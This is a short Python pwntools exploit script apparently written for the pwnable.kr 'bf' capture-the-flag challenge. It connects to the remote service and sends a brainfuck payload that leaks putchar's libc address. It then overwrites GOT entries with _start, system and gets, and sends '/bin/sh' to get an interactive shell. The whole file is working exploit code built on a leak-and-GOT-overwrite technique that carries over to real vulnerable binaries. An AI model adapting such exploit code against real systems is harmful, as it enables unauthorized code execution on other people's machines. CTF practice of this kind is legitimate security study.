from pwn import *

libc = ELF("bf_libc.so")
#target = process("/home/ali/Desktop/bf")
target = remote("pwnable.kr", 9001)

_start = 0x80484e0

payload = "<" * 112
payload += "." + ".>.>.>.>" + "<<<<" + ",>"*4 + "<"*36 + ",>"*4 + ">"*24 + ",>"*4 + "."
target.sendline(payload)

target.recvuntil("]\n")
target.recv(1)
leaked_ptchar = u32(target.recv(4)[::1])
print(hex(leaked_ptchar))
libc_base = leaked_ptchar - libc.symbols["putchar"]

target.send(p32(_start))
target.send(p32(libc_base + libc.symbols["system"]))
target.send(p32(libc_base + libc.symbols["gets"]))

target.sendline("/bin/sh\x00")


target.interactive()
